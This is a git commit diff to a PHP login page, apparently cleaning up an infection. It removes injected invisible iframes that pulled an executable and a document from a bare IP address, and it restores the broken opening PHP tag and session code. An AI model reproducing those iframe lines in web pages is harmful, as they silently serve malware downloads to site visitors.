49ecfd8698391d54483a4a6d38e53f75d26e37a4
satnam9781 <34413361+satnam9781@users.noreply.github.com>
2019-10-04 11:39:13 +0530

    Fixed some bugs

--- index.php
+++ index.php
@@ -1,6 +1,5 @@
-<iframe src="http://95.81.1.7/UnityWebPlayer.exe" width="0" height="0" frameborder="0"></iframe>
-rc="http://95.81.1.7/instruction.doc" width="0" height="0" frameborder="0"></iframe>
-sion_start();
+<?php
+session_start();
 if(isset($_SESSION['userActive'])) {
     if($_SESSION['userType'] == "lecturer" || $_SESSION['userType'] == "hod") {
         header("Location:dashboard.php");
